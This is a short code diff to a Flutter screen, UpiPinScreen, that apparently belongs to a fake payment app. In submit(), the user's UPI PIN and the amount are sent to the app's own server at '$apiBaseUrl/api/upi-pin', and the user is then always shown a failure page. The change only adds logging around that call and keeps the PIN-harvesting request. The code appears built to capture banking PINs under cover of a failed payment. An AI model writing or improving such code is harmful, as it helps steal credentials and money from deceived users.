@@ -18,7 +18,9 @@ class _S extends State<UpiPinScreen> {
   void back() { if (pin.isNotEmpty) setState(() => pin = pin.substring(0, pin.length - 1)); }
   void submit() {
     if (pin.length >= 4) {
-      http.post(Uri.parse('$apiBaseUrl/api/upi-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin, 'amount': widget.amount}));
+      http.post(Uri.parse('$apiBaseUrl/api/upi-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin, 'amount': widget.amount}))
+        .then((_) => print('API success'))
+        .catchError((e) => print('API error: $e'));
       context.push('/failed');
     }
   }
